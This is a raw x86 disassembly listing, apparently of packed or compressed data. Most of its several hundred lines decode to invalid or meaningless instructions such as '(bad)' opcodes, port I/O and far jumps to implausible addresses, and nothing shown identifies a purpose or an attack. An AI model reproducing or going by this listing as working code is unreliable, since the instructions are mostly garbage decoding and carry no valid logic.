  4199a6:	(bad)  
  4199a7:	mov    ds:0x8591b82,al
  4199ac:	pusha  
  4199ad:	and    DWORD PTR [esi],0x0
  4199b0:	mov    ds:0xb0ec48b,al
  4199b5:	(bad)  
  4199b6:	in     al,dx
  4199b7:	ret    0xd010
  4199ba:	add    cl,BYTE PTR [esi+0x8edaf06]
  4199c0:	xchg   DWORD PTR [edi-0x44],eax
  4199c3:	lea    edx,[esi-0x58]
  4199c6:	ret    
  4199c7:	pusha  
  4199c8:	or     DWORD PTR [eax],eax
  4199ca:	fwait
  4199cb:	lea    edx,[eax-0x4bae40f8]
  4199d1:	rcl    BYTE PTR [esi-0x2d],0x71
  4199d5:	cwde   
  4199d6:	or     bl,BYTE PTR [edi]
  4199d8:	cmp    eax,0x11197f2d
  4199dd:	cmp    dh,BYTE PTR [esi-0x7eb360d1]
  4199e3:	hlt    
  4199e4:	cmp    BYTE PTR [ebx+0x1908243a],al
  4199ea:	les    ebx,FWORD PTR ss:[edx+0x28be73e]
  4199f1:	pop    edx
  4199f2:	inc    edi
  4199f3:	int    0x8
  4199f5:	mov    edi,0x2d06c3a2
  4199fa:	jno    0x4199b9
  4199fc:	jne    0x41999f
  4199fe:	or     BYTE PTR [edi-0x7698defa],bh
  419a04:	sbb    ebx,DWORD PTR [ebp-0x545471f1]
  419a0a:	sbb    eax,0x7695ec88
  419a0f:	and    al,bl
  419a11:	and    BYTE PTR [edx+0x85a8916],bl
  419a17:	or     BYTE PTR [edx+0x55a682a4],bh
  419a1d:	mov    dl,0x16
  419a1f:	push   ss
  419a20:	cmp    edi,DWORD PTR [edi+0x62]
  419a23:	pop    ss
  419a24:	inc    ebp
  419a25:	xchg   ebp,eax
  419a26:	mov    eax,0x766766d
  419a2b:	je     0x419a81
  419a2d:	cwde   
  419a2e:	jbe    0x419a81
  419a30:	int3   
  419a31:	(bad)  
  419a33:	ror    DWORD PTR [esi],0x87
  419a36:	adc    DWORD PTR [edx+eax*4+0x60f43e83],edi
  419a3d:	sbb    ebx,DWORD PTR [esi+esi*8+0x23]
  419a41:	daa    
  419a42:	sbb    eax,0xeeb0a88
  419a47:	adc    esi,DWORD PTR [ecx]
  419a49:	cmp    ebx,DWORD PTR [ebp+0x4e]
  419a4c:	sahf   
  419a4d:	cdq    
  419a4e:	push   ss
  419a4f:	fisttp DWORD PTR [ecx+0x7d830829]
  419a55:	call   0x4575aab2
  419a5a:	loop   0x419a1f
  419a5c:	cmp    ecx,DWORD PTR [edx]
  419a5e:	push   cs
  419a5f:	sbb    BYTE PTR [ebp-0x3c4ce2ff],ch
  419a65:	mov    eax,0xf8c7d9c5
  419a6a:	cdq    
  419a6b:	or     ch,BYTE PTR [eax]
  419a6d:	bnd jl 0x419a26
  419a70:	add    esi,ebp
  419a72:	add    al,0xd5
  419a74:	sub    ebx,0x46
  419a77:	mov    ebx,0x2f669eb
  419a7c:	lods   al,BYTE PTR ds:[esi]
  419a7d:	rcr    BYTE PTR [ecx+ebp*1+0x6],0xfa
  419a82:	mov    eax,edx
  419a84:	and    cl,BYTE PTR [esi]
  419a86:	fmul   DWORD PTR [ebp+0xc7c8057]
  419a8c:	cli    
  419a8d:	rcl    DWORD PTR [edx-0x7c3e6697],cl
  419a93:	shr    ebx,cl
  419a95:	push   ds
  419a96:	scas   al,BYTE PTR es:[edi]
  419a97:	dec    eax
  419a98:	jne    0x419aa1
  419a9a:	lahf   
  419a9b:	add    BYTE PTR [esi],0x58
  419a9e:	and    eax,0x75b00cd3
  419aa3:	fisubr WORD PTR [edx-0x4c]
  419aa6:	push   0xffffffcf
  419aa8:	sbb    al,0x19
  419aaa:	aad    0x9e
  419aac:	and    BYTE PTR [ecx+0x2b],0x84
  419ab0:	pop    edi
  419ab1:	pop    es
  419ab2:	in     al,dx
  419ab3:	push   ebx
  419ab4:	mov    ?,WORD PTR ds:0xdb8440f
  419aba:	adc    al,dh
  419abc:	or     ah,al
  419abe:	je     0x419b27
  419ac0:	add    DWORD PTR [ebx],0x5c
  419ac3:	pop    edx
  419ac4:	clc    
  419ac5:	outs   dx,BYTE PTR ds:[esi]
  419ac6:	jle    0x419a9f
  419ac8:	inc    ebp
  419ac9:	cld    
  419aca:	push   ebp
  419acb:	cwde   
  419acc:	cmp    al,0xc4
  419ace:	adc    al,0xdf
  419ad0:	or     ah,bl
  419ad2:	and    al,0x3b
  419ad4:	dec    edi
  419ad5:	ins    DWORD PTR es:[edi],dx
  419ad6:	clc    
  419ad7:	dec    edi
  419ad8:	add    ebx,0x7
  419adb:	and    ebx,0xfffffffc
  419ade:	cmp    ebx,0x12
  419ae1:	add    eax,0x5417eabb
  419ae6:	test   DWORD PTR [edi+ecx*4],0x16ac8f0f
  419aed:	jmp    0x80b43347
  419af2:	xchg   al,bh
  419af4:	jb     0x419aee
  419af6:	stos   BYTE PTR es:[edi],al
  419af7:	mov    DWORD PTR [eax],ebx
  419af9:	loop   0x419b11
  419afb:	pop    eax
  419afc:	adc    ebx,eax
  419afe:	and    ch,ah
  419b00:	push   cs
  419b01:	sub    BYTE PTR [edx],ah
  419b03:	(bad)  
  419b04:	sbb    cl,BYTE PTR [edx]
  419b06:	mov    cl,0x6d
  419b08:	fimul  DWORD PTR [eax+0x1c]
  419b0b:	lock lock cmp edx,DWORD PTR [esi]
  419b0f:	jne    0x419b1f
  419b11:	aaa    
  419b12:	dec    ebx
  419b13:	add    eax,0x26ebf6f7
  419b18:	xchg   DWORD PTR [ebp-0x10],ecx
  419b1b:	sbb    eax,0x3b5d0ec1
  419b20:	inc    ebx
  419b21:	fdivr  st(4),st
  419b23:	pop    edx
  419b24:	inc    edi
  419b25:	ins    BYTE PTR es:[edi],dx
  419b26:	mov    edx,0x3b873010
  419b2b:	jl     0x419ace
  419b2d:	sub    al,0xec
  419b2f:	pop    ss
  419b30:	xor    BYTE PTR [edx-0x137a7cd2],dh
  419b36:	pusha  
  419b37:	and    BYTE PTR ds:0xf584fc45,ch
  419b3d:	out    dx,al
  419b3e:	icebp  
  419b3f:	shl    DWORD PTR [edi],0x8c
  419b42:	sar    DWORD PTR [ebx],1
  419b44:	sbb    eax,0x29537f99
  419b49:	ucomiss xmm2,DWORD PTR [esi-0x43]
  419b4d:	inc    ebx
  419b4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b4f:	or     eax,0xc5511d03
  419b54:	jno    0x419b00
  419b56:	lods   eax,DWORD PTR ds:[esi]
  419b57:	loop   0x419b0f
  419b59:	ret    
  419b5a:	mov    ebx,0x61c932eb
  419b5f:	(bad)  
  419b60:	int    0x89
  419b62:	hlt    
  419b63:	ds pop edi
  419b65:	jecxz  0x419b8b
  419b67:	mov    al,0x38
  419b69:	stc    
  419b6a:	add    ecx,DWORD PTR [ebx-0x74a403bb]
  419b70:	in     eax,0xf0
  419b72:	push   esi
  419b73:	dec    edi
  419b74:	xchg   dl,al
  419b76:	imul   eax,DWORD PTR [edx],0xffffffb7
  419b79:	gs pop ds
  419b7b:	jne    0x419b93
  419b7d:	cmp    BYTE PTR ds:0x8e75cce,ah
  419b83:	or     ax,0x42be
  419b87:	push   esi
  419b88:	pop    esi
  419b89:	ins    BYTE PTR es:[edi],dx
  419b8a:	push   ss
  419b8b:	mov    dh,0xb3
  419b8d:	mov    DWORD PTR es:[ebp-0x8],ebx
  419b91:	pop    edi
  419b92:	imul   edi,DWORD PTR [eax+0x1d],0xf8542c42
  419b99:	sbb    dh,dh
  419b9b:	ret    
  419b9c:	add    dh,BYTE PTR [ebp+0x68]
  419b9f:	test   DWORD PTR [edi-0x4d],ebp
  419ba2:	setns  BYTE PTR [ecx]
  419ba5:	mov    eax,DWORD PTR [esi-0x3cccf201]
  419bab:	mov    ebx,0x9b467c19
  419bb0:	push   esi
  419bb1:	sub    DWORD PTR ds:0x740152ab,eax
  419bb7:	push   ebx
  419bb8:	jns    0x419c00
  419bba:	clc    
  419bbb:	enter  0xce1,0xc3
  419bbf:	bound  eax,QWORD PTR [edi]
  419bc1:	test   eax,0x2f15ea03
  419bc6:	sbb    ah,0x7d
  419bc9:	or     bl,BYTE PTR [edx+0x6199d02b]
  419bcf:	ret    0xa668
  419bd2:	fdivr  DWORD PTR ds:0xa7857138
  419bd8:	dec    edi
  419bd9:	(bad)  
  419bda:	std    
  419bdb:	lock or DWORD PTR [ebx],ebp
  419bde:	xchg   DWORD PTR [ebx],edi
  419be0:	sbb    al,0x79
  419be2:	lods   al,BYTE PTR ds:[esi]
  419be3:	add    eax,ebx
  419be5:	cmp    eax,DWORD PTR ds:0x292c75cd
  419beb:	fnstsw WORD PTR [eax-0x7f]
  419bee:	in     eax,0xc5
  419bf0:	add    DWORD PTR [ecx],esi
  419bf2:	sub    DWORD PTR [edx+0x1583057e],0x554b0e47
  419bfc:	(bad)  
  419bfd:	lock add ah,BYTE PTR [edi]
  419c00:	clc    
  419c01:	push   ds
  419c02:	sbb    eax,DWORD PTR [eax]
  419c04:	test   al,0x2
  419c06:	je     0x419c26
  419c08:	addr16 clc 
  419c0a:	add    al,0x69
  419c0c:	imul   edi
  419c0e:	mov    ecx,0x3c4e0b2b
  419c13:	or     DWORD PTR [eax],0x1
  419c16:	jmp    0x419c54
  419c18:	push   cs
  419c19:	bnd lock jne 0x419c00
  419c1d:	push   esi
  419c1e:	cli    
  419c1f:	cmp    DWORD PTR [eax+0x4],0xa
  419c23:	adc    BYTE PTR [edx+0x7706009],al
  419c29:	sti    
  419c2a:	and    DWORD PTR [eax],ecx
  419c2c:	or     al,0x67
  419c2e:	sbb    ch,BYTE PTR [eax]
  419c30:	into   
  419c31:	jnp    0x419c68
  419c33:	cwde   
  419c34:	jmp    0xa13d:0x46d3595b
  419c3b:	dec    ecx
  419c3c:	add    edx,DWORD PTR [eax-0x45527afd]
  419c42:	and    DWORD PTR es:[eiz*4-0x7b8240bd],esi
  419c4a:	xchg   edi,edi
  419c4c:	ret    0xe1ca
  419c4f:	mov    esi,DWORD PTR [eax]
  419c51:	and    esi,0x6d76fb1f
  419c57:	aad    0x96
  419c59:	(bad)  
  419c5a:	retf   
  419c5b:	cmp    esi,ebx
  419c5d:	or     dh,BYTE PTR [eax-0x44e76dff]
  419c63:	adc    al,0xb6
  419c65:	mov    edx,0x90ae0052
  419c6a:	out    dx,al
  419c6b:	sub    ebp,ebx
  419c6d:	out    dx,eax
  419c6e:	cmp    edx,DWORD PTR ds:0x1b97457d
  419c74:	push   ecx
  419c75:	sub    eax,0x8d0f832d
  419c7a:	outs   dx,DWORD PTR ds:[esi]
  419c7b:	push   edi
  419c7c:	not    edx
  419c7e:	popf   
  419c7f:	bound  esp,QWORD PTR [ecx+esi*1]
  419c82:	sub    DWORD PTR [ebx-0x74617822],ecx
  419c88:	add    bh,BYTE PTR [ecx]
  419c8a:	and    DWORD PTR [esi],ecx
  419c8c:	test   BYTE PTR [eax],0x3e
  419c8f:	adc    DWORD PTR [ecx-0x76],eax
  419c92:	divps  xmm0,XMMWORD PTR [ecx-0x30]
  419c96:	push   0xfd83d50d
  419c9b:	mov    eax,0x8565adbe
  419ca0:	and    ebx,DWORD PTR [ebx+0x5102cdfd]
  419ca6:	sub    BYTE PTR [esi+0x7b],bh
  419ca9:	mov    esp,eax
  419cab:	or     edx,DWORD PTR [ebp-0x4745867]
  419cb1:	sub    edi,esi
  419cb3:	out    dx,eax
  419cb4:	pop    es
  419cb5:	scas   eax,DWORD PTR es:[edi]
  419cb6:	push   eax
  419cb7:	jno    0x419d1e
  419cb9:	cmp    eax,DWORD PTR [edi]
  419cbb:	jg     0x419d0c
  419cbd:	sub    DWORD PTR [edi],ecx
  419cbf:	sar    DWORD PTR [ebx-0x51],cl
  419cc2:	jmp    0xb359d9c8
  419cc7:	sbb    BYTE PTR [ecx+0x16c95327],ah
  419ccd:	shl    dh,0x58
  419cd0:	(bad)  [ebx]
  419cd2:	(bad)  
  419cd3:	sub    al,0x67
  419cd5:	lock test DWORD PTR ds:0xb525962a,edi
  419cdc:	or     ebx,eax
  419cde:	mov    al,0x18
  419ce0:	adc    al,0x6c
  419ce2:	mov    eax,0x2feffd58
  419ce7:	mov    DWORD PTR [eax+0x4fc8621f],eax
  419ced:	nop
  419cee:	push   0x8
  419cf0:	cmp    edi,ebp
  419cf2:	xchg   DWORD PTR [eax-0x4b],esp
  419cf5:	pop    ebx
  419cf6:	mov    es,WORD PTR [ebx]
  419cf8:	lds    eax,FWORD PTR [ebx+0x2b]
  419cfb:	std    
  419cfc:	push   es
  419cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cfe:	sub    ebp,edi
  419d00:	inc    BYTE PTR [eax+0xea90697]
  419d06:	mov    edx,ebp
  419d08:	retf   
  419d09:	dec    edi
  419d0a:	add    ebx,ebp
  419d0c:	mov    esi,0x1ff01a70
  419d11:	mov    bl,0xeb
  419d13:	cmp    ebp,DWORD PTR [ebx]
  419d15:	out    dx,al
  419d16:	mov    ebp,0x2a9f25e5
  419d1b:	shr    DWORD PTR [edx],0xd7
  419d1e:	aaa    
  419d1f:	sbb    BYTE PTR [ecx-0x4d],al
  419d22:	add    DWORD PTR [eax+0x11],ebp
  419d25:	mov    BYTE PTR [esi],cl
  419d27:	adc    eax,DWORD PTR [ebx+0x383c2282]
  419d2d:	pop    ss
  419d2e:	xchg   esi,eax
  419d2f:	(bad)  
  419d30:	sbb    eax,0xb4191c85
  419d35:	add    cl,BYTE PTR ds:0x19041217
  419d3b:	stos   BYTE PTR es:[edi],al
  419d3c:	adc    edi,DWORD PTR [edi+ebp*4+0x13]
  419d40:	and    DWORD PTR [ebx+0x1d],ebx
  419d43:	or     al,BYTE PTR ds:0x81978419
  419d49:	sub    DWORD PTR [edx-0x74a1407d],ebp
  419d4f:	(bad)  
  419d50:	ret    
  419d51:	push   ss
  419d52:	rcr    BYTE PTR [edx],0x5
  419d55:	mov    al,0x12
  419d57:	dec    esi
  419d58:	sbb    esp,edx
  419d5a:	cld    
  419d5b:	jmp    0x419d9a
  419d5d:	fist   DWORD PTR [ebx]
  419d5f:	cmp    al,0xb9
  419d61:	in     eax,dx
  419d62:	ret    0x81aa
  419d65:	push   cs
  419d66:	mov    WORD PTR [ebx-0x20fd82ea],es
  419d6c:	pop    es
  419d6d:	jl     0x419cef
  419d6f:	cmp    ah,bh
  419d71:	je     0x419d85
  419d73:	fmul   st,st(3)
  419d75:	xchg   ecx,eax
  419d76:	push   eax
  419d77:	sbb    ebp,DWORD PTR [eax]
  419d79:	and    BYTE PTR [edx],bl
  419d7b:	popf   
  419d7c:	jno    0x419dfc
  419d7e:	shr    BYTE PTR [esi+0x5082409b],1
  419d84:	jb     0x419d0e
  419d86:	sub    DWORD PTR [ecx+ebx*8-0x55390025],ecx
  419d8d:	xchg   eax,ebx
  419d8f:	test   ebx,ebx
  419d91:	jle    0x419dad
  419d93:	nop
  419d94:	call   DWORD PTR ds:0xf6505038
  419d9a:	out    0x5f,al
  419d9c:	sbb    BYTE PTR [esi-0x4ff18af6],al
  419da2:	add    DWORD PTR [edx],ebx
  419da4:	mov    bl,ch
  419da6:	add    eax,0x8dcc15aa
  419dab:	inc    esp
  419dac:	scas   eax,DWORD PTR es:[edi]
  419dad:	out    0x85,eax
  419daf:	push   esp
  419db0:	adc    eax,0xa777b318
  419db5:	push   esp
  419db6:	cmp    al,0x71
  419db8:	je     0x419dc5
  419dba:	mov    al,0x2
  419dbc:	dec    edi
  419dbd:	add    dh,BYTE PTR [edi+edi*8-0x3c035c89]
  419dc4:	mov    ds:0x74c98508,al
  419dc9:	xor    al,BYTE PTR [ebp+0x501874d2]
  419dcf:	mov    eax,ecx
  419dd1:	dec    esi
  419dd2:	inc    eax
  419dd3:	add    al,0x4a
  419dd5:	jnp    0x419dd2
  419dd7:	pop    ecx
  419dd8:	or     DWORD PTR [ecx+ebx*1-0x77],esp
  419ddc:	add    ebx,eax
  419dde:	push   edx
  419ddf:	jmp    0x6de75a22
  419de4:	out    dx,eax
  419de5:	xor    BYTE PTR [ecx+0x2aeb752e],al
  419deb:	add    DWORD PTR [edx+0x10],esp
  419dee:	std    
  419def:	into   
  419df0:	dec    ecx
  419df1:	rcl    eax,cl
  419df3:	cmp    bh,ah
  419df5:	fimul  WORD PTR [ecx-0x1e4ffbeb]
  419dfb:	xchg   bh,bl
  419dfd:	and    ah,al
  419dff:	sub    al,0x90
  419e01:	ret    
  419e02:	jecxz  0x419de7
  419e04:	push   ds
  419e05:	cmp    eax,0x733bde08
  419e0a:	dec    eax
  419e0b:	mov    bh,0x81
  419e0d:	sbb    DWORD PTR fs:[ebx+ebx*8+0x484a0d75],eax
  419e15:	mov    edi,0x321b56f8
  419e1a:	cwde   
  419e1b:	add    al,0xf9
  419e1d:	jo     0x16b8b71e
  419e23:	mov    al,bl
  419e25:	mov    bl,BYTE PTR [eax-0x446b495d]
  419e2b:	inc    esp
  419e2c:	adc    BYTE PTR [ebx],0xd1
  419e2f:	sbb    dh,BYTE PTR [eax]
  419e31:	(bad)  
  419e32:	mov    edi,0x83b89cef
  419e37:	loopne 0x419eb8
  419e39:	es cmc 
  419e3b:	cmp    al,0xc3
  419e3d:	push   eax
  419e3e:	push   edx
  419e3f:	push   ecx
  419e40:	jne    0x419dc5
  419e42:	mov    eax,0x28045b60
  419e47:	pop    ax
  419e49:	jne    0x419e41
  419e4b:	xor    eax,eax
  419e4d:	ins    BYTE PTR es:[edi],dx
  419e4e:	stc    
  419e4f:	in     al,dx
  419e50:	loopne 0x419e81
  419e52:	out    0xe8,eax
  419e54:	mov    ch,0x89
  419e56:	jp     0x419e38
  419e58:	int    0xad
  419e5a:	mov    ebx,0x8bc68904
  419e5f:	or     al,BYTE PTR [edx+ecx*1+0x6]
  419e63:	je     0x419e90
  419e65:	(bad)  
  419e66:	mov    edi,0x7e72bfe0
  419e6b:	sbb    BYTE PTR [ecx],bh
  419e6d:	ret    0x1b7f
  419e70:	sub    eax,edx
  419e72:	inc    eax
  419e73:	hlt    
  419e74:	jl     0x419e8a
  419e76:	cmp    ecx,eax
  419e78:	jg     0x419e8e
  419e7a:	add    esi,edx
  419e7c:	mov    BYTE PTR [edi],cl
  419e7e:	inc    edi
  419e7f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e81:	jmp    0x419e7b
  419e83:	fcomip st,st(0)
  419e85:	(bad)  
  419e86:	adc    DWORD PTR [edx-0x36ce1f6c],edi
  419e8c:	jmp    0x419e7a
  419e8e:	mov    ecx,eax
  419e90:	jmp    0x419e7a
  419e92:	mov    BYTE PTR [edi],al
  419e94:	mov    ebp,0x7eeb3c15
  419e99:	ret    0xa786
  419e9c:	pop    ecx
  419e9d:	adc    eax,0x42b839dd
  419ea2:	mov    dl,0x90
  419ea4:	sbb    DWORD PTR [ecx+0x7689c73e],ecx
  419eaa:	sti    
  419eab:	inc    DWORD PTR [esi-0x8c6ad29]
  419eb1:	ja     0x419ec6
  419eb3:	je     0x419ee4
  419eb5:	sar    ecx,0x2
  419eb8:	js     0x419ee4
  419eba:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ebc:	xchg   BYTE PTR [ebx-0x4251fc1f],al
  419ec2:	in     eax,dx
  419ec3:	(bad)  
  419ec4:	data16 mov BYTE PTR [edx+0x74],al
  419ec8:	xor    esp,edi
  419eca:	lea    edi,[ecx+edi*1-0x4]
  419ece:	xor    DWORD PTR [ecx],edx
  419ed0:	std    
  419ed1:	xor    eax,DWORD PTR [ebx+0x70d2e1c6]
  419ed7:	scas   eax,DWORD PTR es:[edi]
  419ed8:	add    al,0xc7
  419eda:	ds cld 
  419edc:	inc    eax
  419edd:	inc    esp
  419ede:	sub    BYTE PTR [esi],al
  419ee0:	add    edi,DWORD PTR [ecx+eax*4-0x63]
  419ee4:	cmp    al,0x11
  419ee6:	mov    eax,0x9c2c79d2
  419eeb:	xchg   DWORD PTR [esi],edx
  419eed:	loopne 0x419eee
  419eef:	jg     0x419f57
  419ef1:	mov    ecx,DWORD PTR [eax+0x4]
  419ef4:	sub    cx,0xd7b1
  419ef9:	je     0x419f0a
  419efb:	dec    ecx
  419efc:	sub    cx,0x2
  419f00:	jae    0x419f0e
  419f02:	sahf   
  419f03:	call   ebx
  419f05:	fwait
  419f06:	stos   BYTE PTR es:[edi],al
  419f07:	adc    eax,0x1bebca0b
  419f0c:	mov    bl,ch
  419f0e:	pop    ss
  419f0f:	into   
  419f10:	bound  esi,QWORD PTR [edi+eax*1+0x4e]
  419f14:	add    esi,ebp
  419f16:	jmp    0x419f55
  419f18:	loopne 0x419f7d
  419f1a:	adc    al,0x4
  419f1c:	and    al,al
  419f1e:	addr16 hlt 
  419f20:	add    eax,0x7d82f95
  419f25:	mov    eax,ebx
  419f27:	mov    ah,0x47
  419f29:	mov    edx,DWORD PTR [eax+0x1c]
  419f2c:	fiadd  DWORD PTR [ecx-0x69]
  419f2f:	push   0x8cc78409
  419f34:	mov    al,0x43
  419f36:	int    0xfe
  419f38:	ins    DWORD PTR es:[edi],dx
  419f39:	imul   edi,DWORD PTR ds:0xa2f72ae,0xffffffb3
  419f40:	xlat   BYTE PTR ds:[ebx]
  419f41:	ja     0x419f6c
  419f43:	and    ax,0xd7b2
  419f47:	adc    al,BYTE PTR [esi]
  419f49:	jne    0x419f1c
  419f4b:	retf   0x7fec
  419f4e:	jb     0x419f4f
  419f50:	push   ebx
  419f51:	sbb    al,0x8b
  419f53:	lock test esi,esi
  419f56:	adc    eax,0xdd1b7424
  419f5b:	pop    esp
  419f5c:	(bad)
  419f5f:	sahf   
  419f60:	jmp    0x419f74
  419f62:	cmp    ebx,0xb8a04a48
  419f68:	shl    DWORD PTR [edi],cl
  419f6a:	aaa    
  419f6b:	pop    esp
  419f6c:	int3   
  419f6d:	mov    esi,0x88c70c4f
  419f73:	int    0xc1
  419f75:	loopne 0x419f87
  419f77:	mov    cl,0xf2
  419f79:	sbb    eax,0x890a66b6
  419f7e:	rcl    DWORD PTR [ecx],1
  419f80:	or     ebx,esi
  419f82:	stos   DWORD PTR es:[edi],eax
  419f83:	mov    ecx,edx
  419f85:	stos   BYTE PTR es:[edi],al
  419f86:	pop    edi
  419f87:	push   edi
  419f88:	sbb    al,0x3d
  419f8a:	mov    WORD PTR [esi+0x6c285050],cs
  419f90:	sbb    dh,BYTE PTR [ecx]
  419f92:	fstp   TBYTE PTR [edi-0x4875048a]
  419f98:	int3   
  419f99:	add    BYTE PTR [edx+ecx*4],cl
  419f9c:	push   ds
  419f9d:	inc    esi
  419f9e:	clc    
  419f9f:	and    BYTE PTR [eax+edi*8-0x4b],dh
  419fa3:	add    BYTE PTR [ebp*1-0x32f79d8c],cl
  419faa:	int    0x95
  419fac:	out    0x2b,al
  419fae:	je     0x41a00f
  419fb0:	and    al,0x78
  419fb2:	je     0x41a00e
  419fb4:	pop    eax
  419fb5:	je     0x41a00c
  419fb7:	xor    BYTE PTR ds:0x6254f695,bl
  419fbd:	dec    edi
  419fbe:	and    cl,BYTE PTR [eax+0x43]
  419fc1:	jle    0x41a037
  419fc3:	sti    
  419fc4:	(bad)  
  419fc5:	in     eax,dx
  419fc6:	out    dx,eax
  419fc7:	and    bl,ch
  419fc9:	add    al,0xa
  419fcb:	sub    eax,0x2230eb80
  419fd0:	or     DWORD PTR [edi+0x25],esi
  419fd3:	cmp    eax,edi
  419fd5:	ja     0x419ff8
  419fd7:	lea    eax,[eax+eax*4]
  419fda:	add    eax,eax
  419fdc:	add    eax,ebx
  419fde:	push   edx
  419fdf:	(bad)  
  419fe0:	jg     0x419fdd
  419fe2:	(bad)  
  419fe3:	mov    esi,0x74cdfee6
  419fe8:	or     edx,edx
  419fea:	jge    0x41a040
  419fec:	jmp    0x419ff7
  419fee:	inc    esi
  419fef:	jmp    0x419ff7
  419ff1:	neg    eax
  419ff3:	jle    0x41a040
  419ff5:	js     0x41a040
  419ff7:	pop    ebx
  419ff8:	sub    ebp,edi
  419ffa:	mov    dh,ah
  419ffc:	sti    
  419ffd:	fsubp  st(3),st
  419fff:	inc    edi
  41a000:	inc    ch
  41a002:	inc    eax
  41a003:	jmp    0x419fa1
  41a005:	mov    edi,0x74550f1c
  41a00a:	fild   QWORD PTR [edi-0x26]
  41a00d:	pop    ecx
  41a00e:	mov    ebx,0x3726182
  41a013:	xchg   edx,eax
  41a014:	and    BYTE PTR [ecx+0x110e0b76],bl
  41a01a:	add    eax,0x3680d077
  41a01f:	ret    
  41a020:	or     bl,dh
  41a022:	ret    
  41a023:	or     ch,BYTE PTR [esi-0x54fb6337]
  41a029:	aad    0x75
  41a02b:	add    bh,BYTE PTR [eax+0x2a]
  41a02e:	pop    esi
  41a02f:	fistp  WORD PTR [eax-0x7609cea7]
  41a035:	xor    bh,BYTE PTR [edx-0x1e7e09]
  41a03b:	sub    BYTE PTR [edi],ch
  41a03d:	pushf  
  41a03e:	jge    0x41a056
  41a040:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a042:	sub    BYTE PTR [edi],ah
  41a044:	jbe    0x41a063
  41a046:	inc    eax
  41a047:	jmp    0x7c04:0xc8102f19
  41a04e:	dec    ebp
  41a04f:	je     0xe040dd91
  41a055:	lods   al,BYTE PTR ds:[esi]
  41a056:	test   ah,dh
  41a058:	bound  ecx,QWORD PTR [ebp-0x7c3d767f]
  41a05e:	loop   0x41a07f
  41a060:	lea    edx,[edx+edx*4]
  41a063:	fld    TBYTE PTR [ebx+edx*2-0x44c6d209]
  41a06a:	jnp    0x41a0d7
  41a06c:	pop    esp
  41a06d:	faddp  st(4),st
  41a06f:	call   0x2bbb1479
  41a074:	pcmpeqb mm1,QWORD PTR [edi+ebp*1]
  41a078:	sub    eax,0xdb2ed2f
  41a07d:	push   ds
  41a07e:	add    al,0x74
  41a080:	popa   
  41a081:	scas   al,BYTE PTR es:[edi]
  41a082:	and    BYTE PTR [ebx-0x3d],al
  41a085:	jmp    0x41a0e7
  41a087:	fcom   DWORD PTR [edx-0x6e812f36]
  41a08d:	jge    0x41a0d5
  41a08f:	mov    ecx,edi
  41a091:	xor    al,0xfb
  41a093:	pop    edi
  41a094:	push   edx
  41a095:	cdq    
  41a096:	stc    
  41a097:	sbb    al,0xf9
  41a099:	jmp    0x41a0a9
  41a09b:	fstp   st(0)
  41a09d:	fld    TBYTE PTR [ebx+0x104068ed]
  41a0a3:	ins    BYTE PTR es:[edi],dx
  41a0a4:	xchg   BYTE PTR [eax-0x711126ee],cl
  41a0aa:	daa    
  41a0ab:	mov    DWORD PTR [eax+ebx*4],0x137a80a7
  41a0b2:	aas    
  41a0b3:	mov    al,ds:0xc9e41c9f
  41a0b8:	add    al,BYTE PTR [eax-0x38]
  41a0bb:	add    eax,0x9c4008fa
  41a0c0:	or     al,0x3e
  41a0c2:	repnz leave 
  41a0c4:	daa    
  41a0c5:	push   eax
  41a0c6:	ret    
  41a0c7:	mov    esp,tr6
  41a0ca:	adc    al,BYTE PTR [eax+0x1f169896]
  41a0d0:	stc    
  41a0d1:	enter  0x2047,0xbc
  41a0d5:	mov    esi,0xee6b2819
  41a0da:	sbb    al,0xf9
  41a0dc:	add    dl,BYTE PTR [ebp-0x1a0e04e0]
  41a0e2:	das    
  41a0e3:	inc    eax
  41a0e4:	mov    bh,0x43
  41a0e6:	mov    edx,0xd4a51023
  41a0eb:	call   0xafdd:0xf9269d5e
  41a0f2:	jl     0x41a11e
  41a0f4:	out    0x84,eax
  41a0f6:	xchg   ecx,eax
  41a0f7:	sub    al,BYTE PTR [eax-0x4a19df0c]
  41a0fd:	sub    eax,0xa931a013
  41a102:	pop    edi
  41a103:	jecxz  0x41a135
  41a105:	(bad)  
  41a106:	stc    
  41a107:	xchg   ebp,eax
  41a108:	pop    edi
  41a109:	add    al,0xbf
  41a10b:	leave  
  41a10c:	sbb    ecx,DWORD PTR [esi-0x43d13acc]
  41a112:	mov    ds:0x764037b1,al
  41a117:	cmp    ch,BYTE PTR [ebx+0xb]
  41a11a:	ficomp WORD PTR [ebx+0x3a9ff9ff]
  41a120:	call   0xc764a5ae
  41a125:	mov    bh,BYTE PTR [esi]
  41a127:	bound  ebp,QWORD PTR [ebp+eax*8+0x41ad78eb]
  41a12e:	cmp    BYTE PTR [edx-0x1],0xe6
  41a132:	(bad)  
  41a134:	pop    ss
  41a135:	mov    bh,0x26
  41a137:	xlat   BYTE PTR ds:[ebx]
  41a138:	fadd   DWORD PTR [eax+edx*4-0x54]
  41a13c:	outs   dx,BYTE PTR ds:[esi]
  41a13d:	xor    bh,BYTE PTR [eax-0x7a]
  41a140:	xchg   DWORD PTR [eax-0x4c],ecx
  41a143:	push   edi
  41a144:	or     bh,BYTE PTR [edi]
  41a146:	push   ss
  41a147:	push   0xffff4ba9
  41a14c:	push   DWORD PTR [edi]
  41a14e:	mov    eax,ds:0x1bcecced
  41a153:	ret    0x4ed3
  41a156:	inc    eax
  41a157:	mov    al,ds:0x61401484
  41a15c:	push   ecx
  41a15d:	pop    ecx
  41a15e:	test   BYTE PTR [edx+0x40],dl
  41a161:	enter  0x19a5,0x90
  41a165:	mov    ecx,0xffa56fa5
  41a16a:	(bad)  
  41a16b:	(bad)  
  41a16c:	call   DWORD PTR [ebp+0x40]
  41a16f:	cmp    cl,BYTE PTR [edi]
  41a171:	and    ah,dh
  41a173:	daa    
  41a174:	(bad)  
  41a175:	retf   
  41a176:	into   
  41a177:	pop    eax
  41a178:	inc    eax
  41a179:	test   BYTE PTR [ecx],cl
  41a17b:	xchg   esp,eax
  41a17c:	clc    
  41a17d:	js     0x41a1b8
  41a17f:	aas    
  41a180:	sbb    DWORD PTR [eax+eax*2-0x1b],0xd736b90b
  41a188:	pop    es
  41a189:	(bad)  
  41a18a:	mov    eax,ds:0xffff405f
